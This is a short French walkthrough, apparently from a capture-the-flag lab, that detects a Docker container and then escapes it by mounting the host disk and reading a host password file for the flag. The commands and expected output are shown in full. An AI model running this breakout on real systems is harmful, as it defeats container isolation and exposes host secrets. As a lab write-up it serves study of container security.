### Sommes-nous dans un conteneur Docker ?

Pour vérifier si nous sommes dans un conteneur Docker, vous pouvez exécuter les commandes suivantes :

1. **Lister le contenu de la racine `/` :**

   ```bash
   ls -a /
   ```

   **Résultat attendu :**
   ```bash
   .     bin   dev  home  lib32  libx32  mnt  proc  run   srv  tmp  var
   ..  .dockerenv  boot  etc  lib   lib64  media   opt  root  sbin  sys  usr
   ```
   La présence du fichier `.dockerenv` indique que vous êtes dans un conteneur Docker.

2. **Vérifier les capacités :**

   ```bash
   capsh --print
   ```

   **Résultat attendu :**
   ```bash
   cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
   ```

   Cette sortie montre les capacités accordées dans l'environnement du conteneur.

### Accéder au système de fichiers de l'hôte

3. **Monter le système de fichiers de l'hôte :**

   Créez d'abord un répertoire pour monter le système de fichiers de l'hôte :

   ```bash
   mkdir /tmp/host-fs
   ```

   Ensuite, montez le système de fichiers de l'hôte (supposant que `/dev/sda1` est le bon périphérique) :

   ```bash
   mount /dev/sda1 /tmp/host-fs
   ```

4. **Lire le fichier contenant le mot de passe :**

   Accédez au fichier contenant le mot de passe situé sur le système de fichiers de l'hôte :

   ```bash
   cat /tmp/host-fs/.password
   ```

   Cela affichera le contenu du fichier `.password` qui continet le flag.

